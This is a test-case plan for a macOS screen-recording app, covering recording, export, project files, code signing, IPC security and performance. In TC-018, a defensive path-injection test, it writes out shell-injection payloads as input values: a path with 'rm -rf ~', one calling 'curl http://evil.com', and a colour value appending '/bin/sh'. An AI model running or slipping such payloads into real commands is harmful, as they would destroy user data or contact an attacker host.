# Screen Studio Clone — Test Cases by Feature

**Version:** 1.0
**Date:** 2026-06-29
**Coverage:** Phase 1 (TC-001 to TC-040), Phase 2 (TC-041 to TC-080), Phase 3 (TC-081 to TC-120)

---

## Phase 1 — MVP Test Cases

---

## TC-001: Recording — Start Recording Happy Path
**Type:** E2E
**Priority:** P0
**Preconditions:**
- App is running and on home/display picker screen
- Screen Recording permission granted in System Settings > Privacy & Security
- At least one display available

**Steps:**
1. Launch the application
2. Observe DisplayPicker component renders with available displays listed
3. Select the primary display from the list
4. Click "Start Recording" button
5. Observe recording indicator in menu bar / UI
6. Wait 5 seconds
7. Click "Stop Recording" button

**Expected Result:**
- DisplayPicker shows at least one display option with display name and resolution
- Clicking Start Recording changes RecordingSession state from `ready` to `recording`
- UI transitions to show a live recording indicator (red dot or similar)
- After stop, state transitions to `processing`, then to `done`
- Editor view opens automatically with the recorded clip loaded
- `capture.mov` file exists in the session temp directory
- `cursor.json` file exists with at least one event entry

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Requires real macOS with ScreenCaptureKit entitlement. Cannot be run in CI without hardware.

---

## TC-002: Recording — Stop Recording and Verify Output File
**Type:** Integration
**Priority:** P0
**Preconditions:**
- Recording session has been started and stopped (TC-001 passed)
- Session temp directory is accessible

**Steps:**
1. After TC-001 stop, locate the `.screenstudio` temp session directory
2. Run: `file capture.mov` on the output file
3. Run: `ffprobe -v quiet -print_format json -show_streams capture.mov`
4. Check codec name, width, height, and duration fields

**Expected Result:**
- `file capture.mov` reports: `ISO Media, Apple QuickTime movie`
- `codec_name` is `hevc` (H.265)
- Width and height match the selected display resolution (doubled for Retina: e.g., 2560x1600 for 1280x800 display)
- `duration` is within 0.5 seconds of actual recording time
- `avg_frame_rate` is `60/1` or close

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Use ffprobe from bundled FFmpeg binary: `./resources/bin/ffmpeg/ffprobe`

---

## TC-003: Recording — Cursor JSON Stream Format
**Type:** Integration
**Priority:** P0
**Preconditions:**
- cursor-tracker binary is compiled and in `app.asar.unpacked/bin/`
- Accessibility permission granted in System Settings > Privacy & Security

**Steps:**
1. Launch cursor-tracker binary manually: `./cursor-tracker`
2. Move the mouse around for 3 seconds
3. Click the left mouse button once
4. Press Cmd+C
5. Stop the binary (Ctrl+C)
6. Examine stdout output

**Expected Result:**
- Each line is valid JSON
- Move events have format: `{"t":<float>,"x":<int>,"y":<int>,"type":"move"}`
- Click events have format: `{"t":<float>,"x":<int>,"y":<int>,"type":"click","button":"left"}`
- Keydown events have format: `{"t":<float>,"type":"keydown","key":"cmd+c","display":"⌘C"}`
- Timestamps (`t` field) are Unix epoch seconds with millisecond precision (e.g., `1234567890.123`)
- Events are emitted in chronological order (monotonically increasing `t` values)
- No malformed JSON lines emitted under normal operation

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test on both Apple Silicon and Intel to verify universal binary.

---

## TC-004: Recording — Accessibility Permission Denied (Cursor Tracker)
**Type:** Integration / Manual
**Priority:** P0
**Preconditions:**
- Accessibility permission is NOT granted for the app or cursor-tracker binary
- Test on a fresh macOS account or after revoking permission in System Settings

**Steps:**
1. Ensure Accessibility permission is denied (System Settings > Privacy > Accessibility — app not listed or unchecked)
2. Launch the application
3. Start a recording
4. Move the mouse and click

**Expected Result:**
- App does NOT crash
- User sees a clear permission request dialog or guidance to grant Accessibility permission
- Recording starts anyway (video captured) but cursor tracking is silently disabled or shows a warning
- `cursor.json` may be empty or absent — app handles this gracefully
- Error is propagated via IPC channel `recording:error` with a meaningful code (e.g., `CURSOR_PERMISSION_DENIED`)
- No raw NSException or crash report is generated

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Critical path — TCCs that fail silently are a P0 bug. Must verify on both permission states.

---

## TC-005: Recording — Screen Recording Permission Denied
**Type:** Manual
**Priority:** P0
**Preconditions:**
- Screen Recording permission is NOT granted in System Settings
- Test on a fresh macOS user account

**Steps:**
1. Launch the application with Screen Recording permission denied
2. Attempt to select a display and start recording
3. Observe what happens

**Expected Result:**
- ScreenCaptureKit throws a permissions error
- App catches the error and displays a human-readable dialog explaining: "Screen Recording permission required. Please grant it in System Settings > Privacy & Security > Screen Recording."
- App offers a button to open System Settings directly (using `shell.openExternal('x-apple.systempreferences:...')`)
- App does NOT crash
- State machine remains in `idle` or `ready`, not stuck in `recording`

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Repeat after granting permission to verify recovery without app restart requirement.

---

## TC-006: Recording — Multiple Displays Available
**Type:** E2E / Manual
**Priority:** P1
**Preconditions:**
- Mac connected to at least one external display
- Screen Recording permission granted

**Steps:**
1. Connect an external display (or use display mirroring off)
2. Launch the application
3. Observe DisplayPicker component
4. Select the external display
5. Start recording
6. Perform actions on the external display
7. Stop recording and check output

**Expected Result:**
- DisplayPicker lists all connected displays with correct names (e.g., "LG UltraFine", "Built-in Retina Display")
- Each display shows its resolution
- Recording captures only the selected display (not both)
- `ffprobe` shows dimensions matching the selected external display
- Cursor coordinates in `cursor.json` are relative to the selected display

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** N/A if only one display available — mark as Blocked.

---

## TC-007: Recording — State Machine Transitions (Unit)
**Type:** Unit
**Priority:** P0
**Preconditions:**
- Vitest environment set up
- `RecordingSession.ts` implemented with exported state machine

**Steps:**
1. Import `RecordingSession` in test file
2. Create a new session instance with mocked dependencies
3. Assert initial state is `idle`
4. Call `prepare()` — assert state becomes `ready`
5. Call `start()` — assert state becomes `recording`
6. Call `stop()` — assert state becomes `processing`
7. Simulate processing completion — assert state becomes `done`
8. Test invalid transitions: call `start()` from `idle` — assert error thrown

**Expected Result:**
- All valid state transitions work correctly
- Invalid transitions throw a typed error (e.g., `InvalidStateTransitionError`)
- State is never corrupted by concurrent calls
- Event listeners are called at each transition

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Mock `CaptureProcess`, `CursorProcess`, and `AudioProcess` using vi.mock().

---

## TC-008: Recording — App Recovery After Crash During Recording
**Type:** Manual
**Priority:** P1
**Preconditions:**
- Recording is in progress (TC-001 running)
- Access to terminal to send kill signal

**Steps:**
1. Start a recording session
2. Record for at least 10 seconds
3. In terminal, run: `kill -9 $(pgrep -f "screen-studio")`
4. Relaunch the application

**Expected Result:**
- On relaunch, app detects an interrupted session (partially written `capture.mov` exists)
- App offers to recover the session or discard it
- If recover: editor opens with the partial recording (even if truncated)
- Partial `.mov` file is playable by system player (QuickTime) up to the truncation point
- Session state is NOT left in `recording` state on relaunch
- No unhandled exception dialogs appear

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** May require implementing crash detection in `ProjectManager.ts` — flag `inProgress: true` in manifest during recording, clear on successful completion.

---

## TC-009: IPC — Typed Channel Roundtrip (Integration)
**Type:** Integration
**Priority:** P0
**Preconditions:**
- Electron app can be launched in test mode (headless or with `--no-sandbox`)
- IPC channels defined in `src/shared/ipc-types.ts`

**Steps:**
1. Launch Electron in test mode
2. From renderer (via contextBridge), send: `{ channel: 'recording:start', payload: { displayId: 0, outputPath: '/tmp/test.mov' } }`
3. Observe main process receives the message
4. Main process emits: `{ channel: 'recording:status', payload: { state: 'recording', startTime: <timestamp> } }`
5. Observe renderer receives the status update
6. Send: `{ channel: 'recording:stop' }`
7. Observe main process receives stop command and state transitions

**Expected Result:**
- All channel names match exactly what is defined in `ipc-types.ts`
- Payload types are validated (TypeScript types enforced at compile time, runtime validation via Zod or similar)
- No messages are dropped
- Bidirectional communication completes within 100ms round-trip (measured)
- Invalid channel names are rejected with an error (not silently ignored)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** IPC security: renderer should NOT have access to Node.js APIs directly; all interaction must go through preload contextBridge.

---

## TC-010: IPC — Renderer Cannot Access Node.js APIs Directly
**Type:** Integration / Security
**Priority:** P0
**Preconditions:**
- Electron app running with contextIsolation: true (should be default)

**Steps:**
1. Open DevTools in the Electron renderer window
2. In console, attempt: `require('fs')`
3. Attempt: `window.require('child_process')`
4. Attempt: `window.process.versions`
5. Attempt: `global.__dirname`

**Expected Result:**
- `require` is not defined in renderer context
- `window.require` is not defined
- `window.process` is either undefined or a sanitized subset (no `env` or `argv` with sensitive data)
- Renderer cannot access the filesystem directly
- All Node.js interactions must go through `window.electronAPI` (contextBridge)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** If any of these succeed, it is a Critical security vulnerability. File P0 bug immediately.

---

## TC-011: Preview Canvas — Solid Background Rendering
**Type:** E2E / Manual
**Priority:** P0
**Preconditions:**
- Recording completed, editor view open
- BackgroundPanel visible in sidebar

**Steps:**
1. Open editor with a recorded clip
2. In BackgroundPanel, select "Solid Color" background type
3. Set color to `#FF0000` (pure red)
4. Observe the Konva canvas preview

**Expected Result:**
- Canvas background fills entirely with the selected color `#FF0000`
- The recording content is composited on top with the configured padding
- Color picker changes are reflected in canvas within one animation frame (< 16ms)
- No visual artifacts (no previous background color leaking through)
- Konva stage renders at the correct canvas dimensions

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Use browser DevTools color picker to sample the canvas pixel color to verify exact hex match.

---

## TC-012: Preview Canvas — Gradient Background Rendering
**Type:** E2E / Manual
**Priority:** P1
**Preconditions:**
- Editor view open with a recording

**Steps:**
1. In BackgroundPanel, select "Gradient" background type
2. Set gradient to: Stop 1 = `#0000FF` at 0%, Stop 2 = `#00FF00` at 100%, angle = 45 degrees
3. Observe canvas preview
4. Change the angle to 0 degrees, then 90 degrees
5. Add a third gradient stop at 50%

**Expected Result:**
- Gradient renders from blue to green at 45-degree angle
- Angle changes update the gradient direction immediately
- Third stop is blended smoothly
- Gradient fills the entire background area
- No banding artifacts visible at normal preview size

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Compare gradient rendering in preview vs. exported MP4 — they must match visually.

---

## TC-013: Preview Canvas — Image Background Rendering
**Type:** E2E / Manual
**Priority:** P1
**Preconditions:**
- Editor open, a valid JPEG image available on disk (at least 1920x1080)

**Steps:**
1. In BackgroundPanel, select "Image" background type
2. Click the file picker and select the test JPEG
3. Observe canvas preview with default "cover" fit mode
4. Change fit mode to "contain"
5. Change fit mode to "fill"

**Expected Result:**
- "cover" mode: image fills entire background, cropping edges if necessary, no letterboxing
- "contain" mode: entire image visible, letterboxed if aspect ratio differs
- "fill" mode: image stretched to fill, ignoring aspect ratio
- Image loads without blocking the UI (async loading)
- Memory usage does not spike excessively after image load (< 50MB increase)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with both landscape and portrait images to catch aspect ratio edge cases.

---

## TC-014: Preview Canvas — Blur Background Rendering
**Type:** E2E / Manual
**Priority:** P1
**Preconditions:**
- Editor open, blur background type available

**Steps:**
1. In BackgroundPanel, select "Blur" background type
2. Set blur radius to 20
3. Observe canvas preview
4. Increase blur radius to 80
5. Set blur radius to 0

**Expected Result:**
- Blur background uses a screenshot of the desktop (or a designated `screenshotPath`) as source
- Blur at radius 20 is visibly blurred (frosted glass effect)
- Blur at radius 80 is heavily blurred (nearly uniform color)
- Blur at radius 0 shows the source image unblurred
- Background image is not the live desktop but a static screenshot captured at session start
- Blur renders in < 100ms after radius change (cached or async)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Verify that the blur source is a static screenshot, not live capture (privacy concern).

---

## TC-015: Preview Canvas — Padding Controls
**Type:** E2E
**Priority:** P1
**Preconditions:**
- Editor open with a recording and a colored background

**Steps:**
1. Set background to solid red (#FF0000)
2. In PaddingPanel, set padding to 0
3. Observe canvas — recording should fill the entire canvas
4. Set padding to 40
5. Observe the red border visible around the recording content
6. Set padding to 200 (maximum or near-maximum)

**Expected Result:**
- Padding 0: recording fills canvas edge-to-edge
- Padding 40: uniform 40px red border visible on all four sides
- Padding 200: recording content is significantly smaller, large border visible
- Recording content maintains aspect ratio regardless of padding value
- Padding changes apply instantly (within one animation frame)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Check that padding is applied symmetrically (left == right, top == bottom).

---

## TC-016: Export — MP4 Export Happy Path
**Type:** E2E / Integration
**Priority:** P0
**Preconditions:**
- Recording completed, editor open with a clip
- Export modal accessible from UI

**Steps:**
1. In editor, click "Export" button
2. ExportModal opens
3. Select MP4 format
4. Set resolution to 1920x1080
5. Set quality to "High" (CRF 18)
6. Click "Export"
7. Choose save location (e.g., ~/Desktop/test_export.mp4)
8. Wait for export progress to reach 100%
9. Open the exported file in QuickTime Player

**Expected Result:**
- Export progress bar is shown and updates smoothly
- Export completes without error
- File exists at the chosen save location
- `ffprobe -show_streams test_export.mp4` reports:
  - `codec_name: h264`
  - `width: 1920, height: 1080` (or the configured output resolution)
  - Video and audio streams both present (if audio was recorded)
- QuickTime Player opens the file and plays without errors
- Visual content includes the background and padding as configured

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Verify the FFmpeg command constructed by `FFmpegWrapper.ts` includes the correct `-filter_complex` for background and padding.

---

## TC-017: Export — FFmpeg Command Construction (Unit)
**Type:** Unit
**Priority:** P0
**Preconditions:**
- `FFmpegWrapper.ts` implemented with a method to return the generated command

**Steps:**
1. Import `FFmpegWrapper` in test
2. Create an instance with mock export options:
   - `background: { type: 'solid', color: '#FF0000' }`
   - `padding: 40`
   - `outputPath: '/tmp/out.mp4'`
   - `inputPath: '/tmp/capture.mov'`
3. Call `buildCommand()` and inspect the returned array

**Expected Result:**
- Command starts with path to bundled FFmpeg binary
- Contains `-i /tmp/capture.mov`
- Contains `-filter_complex` with `pad` filter using correct PAD value (40)
- Contains `color=ff0000` or equivalent
- Contains `-c:v libx264 -crf 18 -preset fast`
- Output path is last argument: `/tmp/out.mp4`
- No shell injection possible (arguments are passed as array, not via shell)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** This is a critical security test — user-provided paths must be passed as argument arrays, never concatenated into a shell string.

---

## TC-018: Export — FFmpeg Path Injection Prevention (Security)
**Type:** Unit / Security
**Priority:** P0
**Preconditions:**
- `FFmpegWrapper.ts` implemented

**Steps:**
1. Call `buildCommand()` with a malicious `outputPath`:
   - `"/tmp/out.mp4; rm -rf ~"`
   - `"/tmp/out.mp4 && curl http://evil.com"`
   - Path containing null bytes
2. Call with malicious `inputPath` containing the same payloads
3. Call with malicious background color: `"#FF0000; /bin/sh"`

**Expected Result:**
- In all cases, the path is passed as a distinct element in the arguments array (not shell-interpolated)
- `child_process.spawn` is used with an array of arguments, NOT `child_process.exec` with a string
- Malicious characters in paths cause FFmpeg to fail with a file-not-found error, NOT execute shell commands
- Background color is validated against a hex color regex before use; invalid values throw a validation error

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** P0 security requirement. Any use of `exec()` or string concatenation for FFmpeg commands is a Critical vulnerability.

---

## TC-019: Export — Export Progress IPC Events
**Type:** Integration
**Priority:** P1
**Preconditions:**
- Electron test harness running
- A short test video file available (5-10 seconds)

**Steps:**
1. Trigger an export via IPC: `{ channel: 'export:start', payload: { inputPath: ..., outputPath: ..., options: ... } }`
2. Listen for `export:progress` events
3. Record all progress values received
4. Wait for export to complete

**Expected Result:**
- First `export:progress` event arrives within 2 seconds of `export:start`
- Progress values increase monotonically (never goes backward)
- At least 3 distinct progress values are received for a 10-second clip
- Final progress value is 100 (or 1.0)
- A completion event or final 100% progress is emitted when export finishes
- If FFmpeg crashes, an `export:error` event is emitted with error details

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Parse FFmpeg's stderr `time=HH:MM:SS.ss` output to calculate percentage.

---

## TC-020: Export — Export Cancelled Midway
**Type:** Integration / Manual
**Priority:** P1
**Preconditions:**
- Export of a long clip (60+ seconds) in progress

**Steps:**
1. Start exporting a 60-second recording
2. When progress reaches approximately 50%, click "Cancel" in the UI
3. Observe behavior
4. Check if partial output file exists

**Expected Result:**
- FFmpeg process is terminated (SIGTERM or SIGKILL)
- Partial output file is deleted (no orphaned temp files)
- UI returns to editor state cleanly
- A "Export cancelled" message is shown briefly
- Cancelling does NOT corrupt the source `capture.mov` file

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Verify cleanup runs even if the Electron renderer crashes during export.

---

## TC-021: Project File — Save Project (.screenstudio Bundle)
**Type:** Integration / E2E
**Priority:** P0
**Preconditions:**
- Recording completed, editor open
- Background set to gradient, padding = 40

**Steps:**
1. In editor, configure: gradient background, padding = 40, rounded corners = 16px
2. Click File > Save (or Cmd+S)
3. Choose a save location and filename
4. Navigate to the saved `.screenstudio` directory in Finder
5. Inspect the directory contents

**Expected Result:**
- A `.screenstudio` bundle directory is created at the chosen location
- Bundle contains: `manifest.json`, `capture.mov`, `cursor.json`, `thumbnail.jpg`
- `manifest.json` is valid JSON
- `manifest.json` contains: `background` object with `type: 'gradient'` and correct stops
- `manifest.json` contains: `padding: 40`
- `capture.mov` is the original recording (not a copy with effects applied)
- `thumbnail.jpg` is a valid JPEG and renders correctly

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Do not save the exported MP4 inside the bundle — only the raw capture and metadata.

---

## TC-022: Project File — Open Saved Project
**Type:** E2E / Integration
**Priority:** P0
**Preconditions:**
- A valid `.screenstudio` bundle exists from TC-021

**Steps:**
1. Close the current editor (or relaunch the app)
2. Click File > Open or drag the `.screenstudio` bundle onto the app
3. Observe the editor state after opening

**Expected Result:**
- Editor opens with the correct clip loaded
- Background type is `gradient` with original stops restored
- Padding value is `40`
- Rounded corners are `16px`
- Preview canvas renders with the saved settings
- Playback position is at the beginning
- No errors in the console

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with a project file created by a previous version of the app once versioning is introduced.

---

## TC-023: Project File — Manifest Serialization Round-Trip (Unit)
**Type:** Unit
**Priority:** P0
**Preconditions:**
- `SessionManifest.ts` and `ProjectManager.ts` implemented

**Steps:**
1. Create a `SessionManifest` object with all fields populated (including nested `BackgroundSource`, padding, corners)
2. Serialize to JSON string via `ProjectManager.serialize(manifest)`
3. Parse the JSON string via `ProjectManager.deserialize(jsonString)`
4. Deep-compare original and deserialized objects

**Expected Result:**
- Serialized JSON is valid and parses without error
- All fields are present after deserialization
- Nested objects (`background.stops`, `background.angle`) are correctly preserved
- Number fields are numbers (not strings) after deserialization
- Optional fields that are `undefined` are either omitted or preserved as `null` consistently
- Unknown/future fields in JSON are ignored gracefully (forward compatibility)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with edge cases: empty gradient stops array, very long file paths, Unicode in filenames.

---

## TC-024: Project File — Corrupted Manifest Handling
**Type:** Integration
**Priority:** P1
**Preconditions:**
- A `.screenstudio` bundle exists with a manually corrupted `manifest.json`

**Steps:**
1. Open a valid `.screenstudio` bundle
2. Edit `manifest.json` to make it invalid JSON (e.g., remove a closing brace)
3. Attempt to open the bundle in the app
4. Separately, test with valid JSON but missing required field (`capturePath` removed)
5. Separately, test with a manifest where `background.type` has an unknown value

**Expected Result:**
- Invalid JSON: user sees a clear error dialog "Project file is corrupted. Cannot open."
- Missing required fields: app shows specific error identifying the missing field
- Unknown background type: app falls back to a default solid white background, shows a warning
- In no case does the app crash or throw an unhandled exception
- Source files (`capture.mov`) are not modified or deleted during error handling

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test recovery path — after error, app should return to the home screen cleanly.

---

## TC-025: Code Signing — All Binaries Are Correctly Signed
**Type:** Manual / Integration
**Priority:** P0
**Preconditions:**
- Development or distribution build completed
- All Swift binaries compiled and placed in `app.asar.unpacked/bin/`
- `scripts/sign-helpers.sh` has been run

**Steps:**
1. For each binary in `bin/` directory (capture, cursor-tracker, audio-composer, zoom-renderer, face-detector):
   - Run: `codesign -dv --verbose=4 ./bin/<binary-name>`
   - Run: `codesign --verify --deep --strict ./bin/<binary-name>`
2. Run: `codesign --verify --deep --strict Screen\ Studio.app`
3. Check that all Team IDs match

**Expected Result:**
- `codesign -dv` shows the correct Team ID for all binaries
- `codesign --verify` passes for all binaries without errors
- Deep verification of the `.app` bundle passes
- All binaries have the same Team ID
- FFmpeg binary is also signed with the same Team ID
- Running `spctl --assess --verbose ./Screen\ Studio.app` shows "accepted"

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Unsigned binaries will fail silently on macOS 10.15+ when Gatekeeper is active. This is a P0 requirement.

---

## TC-026: Code Signing — Universal Binary Architecture Check
**Type:** Integration
**Priority:** P0
**Preconditions:**
- All Swift binaries and FFmpeg binary compiled

**Steps:**
1. For each binary in `bin/`: run `file <binary-name>`
2. For FFmpeg: run `file ffmpeg`
3. Run `lipo -info <binary-name>` for each

**Expected Result:**
- `file` command output contains: "Mach-O universal binary with 2 architectures"
- `lipo -info` shows: "arm64 x86_64" (both architectures)
- No binary is single-architecture only (would fail on the other Mac type)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Single-architecture binaries will fail to run on the other CPU type. Non-negotiable.

---

## TC-027: IPC — Child Process Spawn Only From Main Process (Security)
**Type:** Integration / Code Review
**Priority:** P0
**Preconditions:**
- Source code review of renderer process files

**Steps:**
1. Search `src/renderer/` for any use of `child_process`, `require('child_process')`, or `spawn`
2. Search `src/preload/` for any direct file system access or process spawning
3. Verify all process spawning is in `src/main/`

**Expected Result:**
- No `child_process` import found in `src/renderer/` or `src/preload/`
- No `fs` module imported directly in `src/renderer/` (must go via IPC)
- All binary spawning is confined to `src/main/recording/` modules
- `contextBridge.exposeInMainWorld` in preload only exposes safe IPC wrappers

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Automated via grep in CI: `grep -r "child_process" src/renderer/ --include="*.ts"` must return no results.

---

## TC-028: Audio — Microphone Recording Integration
**Type:** Integration / Manual
**Priority:** P1
**Preconditions:**
- Microphone permission granted
- USB or built-in microphone connected
- audio-composer binary compiled

**Steps:**
1. Start a recording with microphone enabled
2. Speak into the microphone during recording
3. Stop recording
4. In editor, check audio waveform (Phase 3) or export MP4
5. Play exported MP4 and verify audio is present

**Expected Result:**
- `audio.m4a` file is created in the session bundle
- Exported MP4 has an audio track
- Speaking during recording is audible in the export
- Audio is synchronized with video (< 100ms offset)
- Audio quality is acceptable (no clipping, no dropouts)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test both microphone-only and system audio + microphone mixed scenarios.

---

## TC-029: App Startup — Time to Interactive
**Type:** Performance / Manual
**Priority:** P1
**Preconditions:**
- App installed (not first launch, to avoid permission dialogs)
- Cold launch (quit completely, wait 5 seconds)

**Steps:**
1. Use macOS Instruments (Time Profiler) or a stopwatch
2. Note the time when the app icon is double-clicked
3. Note the time when the main window is visible and interactive (DisplayPicker rendered)
4. Calculate delta

**Expected Result:**
- App is visible and interactive within 2 seconds of launch
- No beach ball / spinner during normal launch
- Window appears at the correct position (not at 0,0 or offscreen)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** See PERFORMANCE_BENCHMARKS.md for measurement methodology.

---

## TC-030: App Startup — Memory Usage at Idle
**Type:** Performance
**Priority:** P1
**Preconditions:**
- App launched, no recording in progress, no editor open

**Steps:**
1. Launch app and wait 30 seconds for startup to settle
2. Open macOS Activity Monitor
3. Record the "Real Memory" value for the "Screen Studio" process and any helper processes

**Expected Result:**
- Main Electron process: < 200MB Real Memory
- Total memory across all processes (Electron + helpers): < 300MB
- Memory does not grow over time when idle (no memory leak)
- GPU memory usage is minimal when no canvas is active

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** See PERFORMANCE_BENCHMARKS.md for thresholds and methodology.

---

## TC-031: App Startup — Privacy Manifest Validation (macOS 15+)
**Type:** Manual
**Priority:** P1
**Preconditions:**
- App built for distribution (or development build with Info.plist)
- macOS 15+ (Sequoia) for full validation

**Steps:**
1. Locate `Info.plist` in the app bundle
2. Check for `NSPrivacyCollectedDataTypes` key
3. Check for `NSPrivacyAccessedAPITypes` key
4. Submit app to TestFlight or use `altool` validation if testing distribution build

**Expected Result:**
- `NSPrivacyCollectedDataTypes` is present and lists all collected data types
- `NSPrivacyAccessedAPITypes` is present and includes entries for:
  - `NSPrivacyAccessedAPICategoryUserDefaults` (if used)
  - `NSPrivacyAccessedAPICategoryFileTimestamp` (if used)
- Privacy manifest complies with Apple's requirements (App Store validation passes)
- Submission does not produce privacy manifest warnings

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Required for App Store submission. Failure will cause App Store rejection.

---

## TC-032: Recording — CPU Usage During Active Recording
**Type:** Performance
**Priority:** P0
**Preconditions:**
- Recording in progress (TC-001 completed, actively recording)
- macOS Activity Monitor or Instruments open

**Steps:**
1. Start a recording (display selected, recording active)
2. Wait 30 seconds for CPU to stabilize
3. Record CPU usage for all processes related to Screen Studio for 60 seconds
4. Calculate average and peak CPU usage

**Expected Result:**
- Average CPU across all Screen Studio processes: < 30% on Apple Silicon
- Peak CPU: < 50% momentarily
- `capture` binary: < 15% CPU (hardware-accelerated HEVC encoding)
- No CPU spikes causing dropped frames (check via ffprobe frame count vs. expected)
- Thermal throttling does not occur during 5-minute recording

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test on both Apple Silicon and Intel. Intel may have higher CPU usage due to software encoding.

---

## TC-033: Recording — Microphone Permission Denied Graceful Handling
**Type:** Manual
**Priority:** P1
**Preconditions:**
- Microphone permission denied for the app

**Steps:**
1. Start recording with microphone option enabled in UI
2. Observe app behavior

**Expected Result:**
- App does NOT crash
- User is shown a message explaining microphone access was denied
- App falls back to recording without microphone audio
- System audio is still captured (if selected)
- No TCC prompt appears repeatedly in a loop

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Document the exact user-facing message shown.

---

## TC-034: Display Picker — Handles No Display Available
**Type:** Unit / Integration
**Priority:** P1
**Preconditions:**
- Simulated environment with no displays returned by ScreenCaptureKit

**Steps:**
1. Mock `SCShareableContent.current` to return an empty displays array
2. Render DisplayPicker component
3. Observe UI state

**Expected Result:**
- DisplayPicker shows a meaningful empty state ("No displays found")
- Start Recording button is disabled
- No crash or unhandled promise rejection
- App gracefully handles the case and allows the user to retry

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Unit test with mocked SCShareableContent via Swift test double.

---

## TC-035: Zustand Store — Recording Store State Integrity
**Type:** Unit
**Priority:** P1
**Preconditions:**
- `useRecordingStore.ts` implemented with Zustand

**Steps:**
1. Import store in test file
2. Test initial state: `getState()` returns `{ status: 'idle', session: null }`
3. Dispatch `startRecording` action — verify state transitions
4. Dispatch `stopRecording` — verify state and session data
5. Dispatch `resetSession` — verify state returns to idle
6. Test Immer immutability: direct mutation of state object throws error

**Expected Result:**
- Initial state matches expected shape
- Each action produces the correct state
- State is immutable (Immer enforces this)
- State changes trigger React re-renders (verified via test component render count)
- No state leaks between tests (each test gets a fresh store instance)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Use `create` factory pattern to avoid singleton store leaking between tests.

---

## TC-036: FFmpeg Binary — Universal Binary Functional Test
**Type:** Integration
**Priority:** P0
**Preconditions:**
- FFmpeg universal binary available at `resources/bin/ffmpeg/ffmpeg`

**Steps:**
1. On Apple Silicon Mac, run: `./resources/bin/ffmpeg/ffmpeg -version`
2. On Intel Mac (or Rosetta), run the same command
3. Run a simple transcoding test: `./ffmpeg -i test_input.mov -t 5 -c:v libx264 test_output.mp4`
4. Verify output with ffprobe

**Expected Result:**
- FFmpeg starts and prints version info on both architectures
- Version string includes `arch: aarch64` on Apple Silicon, `arch: x86_64` on Intel
- Transcoding test produces a valid MP4 file
- No "Killed: 9" or "Bad CPU type in executable" errors

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** `file ffmpeg` must show "Mach-O universal binary with 2 architectures". Never bundle a single-arch binary.

---

## TC-037: Export — 60-Second 1080p Export Performance
**Type:** Performance / Integration
**Priority:** P0
**Preconditions:**
- A 60-second 1080p `capture.mov` fixture file available (HEVC lossless)
- Export pipeline operational

**Steps:**
1. Load the 60-second fixture into the editor
2. Configure: solid red background, padding = 40
3. Start export to MP4 1080p, record start time
4. Wait for export completion, record end time
5. Calculate export duration

**Expected Result:**
- Export completes in under 30 seconds on Apple Silicon M2 or better
- Export completes in under 60 seconds on Intel Mac
- Output file is a valid MP4 playable in QuickTime
- No FFmpeg error output (stderr is clean)
- CPU usage during export does not exceed 80% sustained

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** See PERFORMANCE_BENCHMARKS.md. Measure with `time` command or `perf_hooks`.

---

## TC-038: Preview Canvas — Konva Rendering Performance
**Type:** Performance / Manual
**Priority:** P1
**Preconditions:**
- Editor open with a 30-second clip
- Clip is playing back in preview

**Steps:**
1. Open Chrome DevTools (Cmd+Option+I in Electron)
2. Go to Performance tab
3. Click Record, let clip play for 10 seconds, click Stop
4. Analyze the frame rate graph

**Expected Result:**
- Frame rate is consistently 60fps (or monitor refresh rate)
- No frames take longer than 16.7ms to render (no jank)
- Konva stage draws complete within 10ms per frame
- No "Forced reflow" warnings in the trace
- Memory usage does not grow monotonically during playback (no canvas leak)

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Test with both solid background and image background (image is more expensive to render).

---

## TC-039: File System — Save to Read-Only Location Handling
**Type:** Integration / Manual
**Priority:** P1
**Preconditions:**
- Export dialog open

**Steps:**
1. Attempt to export MP4 to a read-only location (e.g., `/System/` or a mounted read-only volume)
2. Observe app behavior

**Expected Result:**
- App detects the write failure
- User sees a clear error message: "Cannot write to this location. Please choose a different folder."
- App does NOT crash
- The partial output file (if any) is cleaned up
- Export dialog remains open so user can choose a different location

**Actual Result:** [to be filled during test run]
**Status:** Not Run
**Notes:** Also test with a disk that has insufficient free space.

---

